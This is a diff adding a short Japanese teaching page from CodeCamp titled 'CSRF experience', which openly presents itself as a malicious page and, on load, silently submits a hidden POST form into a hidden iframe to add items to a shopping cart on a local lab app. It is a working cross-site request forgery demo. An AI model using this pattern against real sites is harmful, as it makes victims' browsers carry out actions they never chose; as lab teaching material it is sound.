@@ -1,0 +1,47 @@
+<!--
+/**
+ * @license CC BY-NC-SA 4.0
+ * @license https://creativecommons.org/licenses/by-nc-sa/4.0/deed.ja
+ * @copyright CodeCamp https://codecamp.jp
+ */
+-->
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>csrf体験</title>
+
+<style>
+* {
+	color: red;
+}
+
+body {
+	background-color: black;
+}
+</style>
+<script>
+var send = function () {
+	var form = document.getElementById('form');
+	form.submit();
+
+	alert('カートに商品を登録しました。');
+}
+</script>
+</head>
+<body onload="send()">
+	<h1>csrf体験</h1>
+	<p>
+		このページは悪意ある人物が管理しているページです。
+		<br>読み込みが完了すると、商品を大量にカートに登録してしまいます。
+	</p>
+
+	<form id="form" method="post" target="csrf"
+		action="./top.php">
+		<input type="hidden" name="id" value="1">
+	</form>
+	<div><span style="color: white;">iframeが隠されています。</span></div>
+	<iframe name="csrf" style="display: none;"></iframe>
+</body>
+</html>
